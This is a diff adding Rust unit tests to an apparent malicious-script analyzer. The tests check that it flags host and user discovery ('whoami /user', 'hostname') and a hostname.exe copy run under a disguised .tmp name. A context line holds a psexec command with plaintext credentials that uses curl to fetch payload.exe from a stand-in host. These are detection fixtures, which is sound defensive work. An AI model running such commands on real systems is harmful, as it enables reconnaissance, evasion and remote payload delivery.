@@ -3998,6 +3998,62 @@ C:\Users\Public\nd.tmp query pdc
     }
 
     #[test]
+    fn host_and_user_discovery_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"whoami /user
+hostname
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "whoami-user" && command == "whoami /user"
+            )),
+            "whoami /user enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "hostname" && command == "hostname"
+            )),
+            "hostname enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_hostname_alias_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\hostname.exe C:\Users\Public\hn.tmp
+C:\Users\Public\hn.tmp
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\hn.tmp"#)
+            )),
+            "copied hostname alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "hostname" && command == "hostname.exe"
+            )),
+            "copied hostname enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
